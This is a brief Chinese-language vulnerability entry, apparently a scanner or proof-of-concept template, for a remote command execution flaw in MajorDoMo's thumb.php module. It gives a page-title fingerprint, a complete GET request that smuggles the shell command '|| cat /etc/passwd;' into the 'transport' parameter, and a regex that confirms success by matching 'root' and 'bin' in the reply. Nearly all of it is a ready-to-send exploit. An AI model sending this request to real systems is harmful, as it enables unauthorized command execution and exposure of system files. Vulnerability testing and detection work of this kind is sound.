# MajorDoMothumb远程命令执行漏洞

MajorDoMothumb ｜ 命令执行 ｜ —
- **指纹**：`title="MajordomoSL"`
- **请求**：`GET /modules/thumb/thumb.php?url=cnRzcDocm1EMe3&debug=1&transport=%7C%7C+cat+%2Fetc%2Fpasswd%3B HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$